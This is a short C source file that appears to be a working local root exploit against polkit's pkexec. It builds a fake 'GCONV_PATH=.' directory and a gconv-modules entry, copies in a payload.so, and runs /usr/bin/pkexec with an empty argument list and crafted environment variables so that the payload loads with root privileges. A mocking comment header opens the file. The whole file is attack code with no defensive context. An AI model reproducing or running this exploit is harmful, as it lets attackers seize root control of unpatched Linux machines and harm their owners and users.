/*
 *
 * I am in ur compuuuterz
 * Watching ur @ night
 *
 */

#include <stdlib.h>
#include <sys/stat.h>
#include <stdio.h>

int main()
{
    char *argv[] = { NULL };

    char *envp[] = {
        "temp",
        "PATH=GCONV_PATH=.",
        "SHELL=nonexistent",
        "CHARSET=nonexistent",
        NULL
    };

    struct stat st = {0};

    if (stat("GCONV_PATH=.", &st) == -1) {
	mkdir("GCONV_PATH=.", 0775);
    }

    if (stat("temp", &st) == -1) {
    	mkdir("temp", 0775);
    }

    if (fopen("GCONV_PATH=./temp", "a") == NULL) {
    	exit(1);
    }

    chmod("GCONV_PATH=./temp", 0777);

    FILE *f = fopen("temp/gconv-modules", "a");
    fprintf(f, "module\tINTERNAL\tnonexistent//\tpayload\t2\n");
    fclose(f);
    
    system("cp payload.so temp/");
    execve("/usr/bin/pkexec", argv, envp);

    return 0;
}
